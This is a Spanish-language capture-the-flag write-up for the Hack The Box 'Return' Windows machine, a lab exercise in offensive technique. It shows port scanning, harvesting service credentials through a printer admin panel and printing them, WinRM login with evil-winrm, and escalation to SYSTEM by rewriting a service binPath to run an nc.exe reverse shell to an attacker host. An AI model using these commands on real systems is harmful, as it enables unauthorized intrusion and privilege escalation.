**Dificultad:** Easy 🟢  
**OS:** Windows 🪟

# Enumeración 🔎

## Nmap
```bash
nmap -p- --open -sSCV --min-rate 5000 -n -Pn -vvv [IP] -oN ports.txt
```

```console
PORT       STATE   SERVICE         
53/tcp     open    domain
80/tcp     open    http
88/tcp     open    kerberos-sec
135/tcp    open    msrpc
139/tcp    open    netbios-ssn
389/tcp    open    ldap
445/tcp    open    microsoft-ds?
464/tcp    open    kpasswd5?
593/tcp    open    ncacn_http
636/tcp    open    ldap
3268/tcp   open    tcpwrapped
3269/tcp   open    http
5985/tcp   open    msrpc
9389/tcp   open    msrpc
47001/tcp  open    msrpc
49664/tcp  open    msrpc
49665/tcp  open    msrpc
49666/tcp  open    msrpc
49667/tcp  open    msrpc
49674/tcp  open    ncacn_http
49675/tcp  open    msrpc
49679/tcp  open    msrpc
49682/tcp  open    msrpc
49694/tcp  open    msrpc
55275/tcp  open    msrpc
```

### Puerto 445 (SMB)

En este puerto corre un servicio SMB, el cual procedemos a enumerar con distintas herramientas:

```bash
crackmapexec smb [IP]
```

```text
SMB     [IP]        445        PRINTER      [+] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
```

Al intentar usar una **null session** con `smbclient` y `smbmap` no se obtiene ninguna información relevante.

---

### Puerto 80 (HTTP)

En este puerto corre un servicio HTTP que muestra un panel de administración llamado **HTB Printer Admin Panel**.

En la sección **Settings** encontramos los siguientes campos:
- Server Address
- Server Port
- Username
- Password

Podemos ponernos en escucha con **netcat** y modificar los campos **Server Address** y **Server Port** por nuestra IP y un puerto de escucha para capturar credenciales.

# Explotación ⚔️

Nos ponemos en escucha con netcat:

```bash
nc -lvnp 9001
```

```text
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from [IP].
Ncat: Connection from [IP:49840].
0*%return\svc-printer
            1edFg43012!!
```

Obtenemos unas credenciales, las cuales probamos contra el servicio SMB:

```bash
crackmapexec smb [IP] -u 'svc-printer' -p '1edFg43012!!'
```

```text
SMB     [IP]        445        PRINTER      [+] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB     [IP]        445        PRINTER      [+] return.local\svc-printer:1edFg43012!!
```

Las credenciales son válidas. Como el puerto **5985 (WinRM)** está abierto, probamos acceso mediante Windows Remote Management:

```bash
crackmapexec winrm [IP] -u 'svc-printer' -p '1edFg43012!!'
```

```text
WINRM     [IP]        5985        PRINTER      [+] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
WINRM     [IP]        5985        PRINTER      [+] http://IP:5985/wsman
WINRM     [IP]        5985        PRINTER      [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

El estado **(Pwn3d!)** indica que podemos conectarnos mediante WinRM:

```bash
evil-winrm -i [IP] -u 'svc-printer' -p '1edFg43012!!'
```

```powershell
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```

---

## User Flag 🏳️

La *user flag* se encuentra en:

```text
C:\Users\svc-printer\Desktop\user.txt
```

---

## Root Flag 👑

Comenzamos enumerando el usuario comprometido:

```powershell
net user svc-printer
```

```text
Local Group Memberships      *Print Operators    *Remote Management Users
Global Group memberships    *Server Operators   *Domain Users
```

Llama la atención la pertenencia a los grupos **Print Operators** y **Server Operators**.

Según la documentación de Microsoft, los usuarios del grupo **Server Operators** pueden iniciar y detener servicios.

Intentamos crear un servicio con `sc.exe create`, pero obtenemos acceso denegado. En lugar de crear uno nuevo, modificamos un servicio existente usando `sc.exe config`.

---

### Transferencia de netcat

**Máquina atacante**:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
```

**Máquina víctima (Evil-WinRM)**:
```powershell
upload /usr/share/seclists/Web-Shells/FuzzDB/nc.exe
```

---

### Enumeración de servicios modificables

```powershell
services
```

Entre los servicios listados, el servicio **VMTools** permite modificación.

---

### Modificación del servicio

```powershell
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd [IP_ATACANTE] [PUERTO_ATACANTE]"
```

```text
[SC] ChangeServiceConfig SUCCESS
```

---

### Obtención de shell como SYSTEM

**Máquina atacante**:
```bash
nc -lvnp [PUERTO_ATACANTE]
```

**Máquina víctima**:
```powershell
sc.exe stop VMTools
sc.exe start VMTools
```

Al iniciarse el servicio obtenemos una shell con privilegios elevados:

```text
C:\Windows\System32> whoami
nt authority\system
```

La *root flag* se encuentra en:

```text
C:\Users\Administrator\Desktop\root.txt
```

